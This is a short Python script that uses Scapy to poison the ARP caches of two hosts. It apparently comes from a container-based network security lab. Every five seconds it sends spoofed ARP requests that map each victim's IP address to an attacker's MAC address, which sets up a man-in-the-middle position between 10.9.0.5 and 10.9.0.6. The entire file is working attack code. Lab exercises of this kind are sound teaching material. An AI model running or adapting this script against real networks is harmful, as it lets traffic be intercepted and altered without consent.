from scapy.all import *
import time

# Performs ARP cache poisoning through sending unicast ARP request packets, for a given victim
def poison(srcip, dstip, dstmac):
    E = Ether()
    E.dst = dstmac
    A = ARP()
    A.hwsrc = '02:42:0a:09:00:69'
    A.psrc = srcip
    A.hwdst = '00:00:00:00:00:00'
    A.pdst = dstip
    A.op = 1     # 1 for ARP request; 2 for ARP reply
    pkt = E/A
    sendp(pkt)

begin = time.time()
while True:
    end = time.time()

    if ((end - begin) >= 5.0):
        poison('10.9.0.6', '10.9.0.5', '02:42:0a:09:00:05') # Poisoning A's ARP cache
        poison('10.9.0.5', '10.9.0.6', '02:42:0a:09:00:06') # Poisoning B's ARP cache
        begin = time.time()

        